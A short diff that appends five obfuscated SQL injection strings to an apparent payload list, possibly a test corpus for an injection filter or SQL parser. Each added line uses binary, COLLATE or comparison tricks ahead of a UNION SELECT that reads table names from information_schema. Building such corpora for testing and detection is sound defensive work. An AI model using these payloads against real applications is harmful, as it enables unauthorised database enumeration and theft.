@@ -536,3 +536,9 @@ union (select -sin(1),2,3,4,5)--
 
 
 1;do (1=1)
+
+-0b01 for update union select table_name from information_schema.tables limit 1
+binary _latin1 'true' COLLATE latin1_german2_ci is not unknown union select table_name from information_schema.tables
+binary true COLLATE latin1_german2_ci union select table_name from information_schema.tables
+1<binary 1>2 union select table_name from information_schema.tables limit 1
+binary 1 < binary 2 > binary 3 union select table_name from information_schema.tables limit 1
